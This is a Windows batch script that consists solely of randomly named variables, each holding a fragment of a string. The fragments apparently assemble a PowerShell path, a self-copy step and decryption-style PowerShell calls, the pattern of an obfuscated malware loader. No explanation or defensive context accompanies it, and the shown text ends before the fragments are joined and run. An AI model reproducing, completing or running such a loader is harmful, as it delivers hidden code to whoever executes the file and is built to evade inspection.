@echo off
set "WOhKhONGPG= /"
set "CTjRtRoIZQ=\v"
set "ejRwymzAQG=Wi"
set "zIkPTKtcgt=\W"
set "WshDgAjoaf=32"
set "bnLojVqDKR=Sy"
set "vaVsJRxdLv=1."
set "bokoWApzxB=he"
set "asGqisueqH=ws"
set "BDCnviFZSh=nd"
set "gIsHVnQAUz=we"
set "nFuosvXAbV=rS"
set "OERkovtBWt=in"
set "XqdtGOfxCb=0\"
set "lYjJgyMfji=.e"
set "EdJqCANCUL= C"
set "MRgYvwVOZC=he"
set "loqvIBxxVz=co"
set "TzzXLraYuU=ll"
set "vtCxuNHxRX=y "
set "UWnZXlQQlF=rs"
set "vZfgthfsUe=po"
set "qphpsuACkK=xe"
set "MErOsjGHwI=st"
set "JcaGXSVOFH=py"
set "bFTksQLdLa=em"
set "yTRfZrDkWg=:\"
set "wJXsmsBXoK=Po"
set "jmRJUuwOIS=do"
set "oLRzCulnSp=s\"
set "MfjHjrQxnN=ll"
set "lGAGgSDgnT=we"
set "NVCkaQlUGG=ow"
set "CZCKmAaRAR=cd"
set "OqNFQMdXHF= %~dp0"
set "fQnJewHTWT=oArr"
set "MxwpiHJzNn=-joi"
set "CDstNcFrZI== [S"
set "UuefDzvFiM=k; }"
set "FkkuBxkiSF=esMa"
set "TVzrbYYPim=ct S"
set "QQsYdTesWq= '')"
set "CUcRMWCyWh= = N"
set "QQnlNPONkh=ress"
set "KNzGySjTgV='dqR"
set "absMpKMgRP=File"
set "qjQKBVFrNj=lBlo"
set "FhxVKwhdYu=rofi"
set "PioyyYkbdv=le  "
set "aCbBMVhcHD=rtS4"
set "CSTwDtXfIa=mj ="
set "wbFOULzVJv=ode]"
set "naKNrbIVgc=tem."
set "XApvkQJmLK=.Con"
set "WLIQIFNkFv=rans"
set "QtCeTyIugc=ress"
set "DkcWDhZlva=7;$k"
set "AoYEvNwaUs=gOy "
set "fNJSDYNTjb=mj);"
set "ICIodexfZv=; };"
set "pYmRAcxZXN=-4] "
set "NXFppITiTI=.Key"
set "xLwctTgGAk=ach "
set "uKksullCWo=n ''"
set "YRPEuhPUNn=736u"
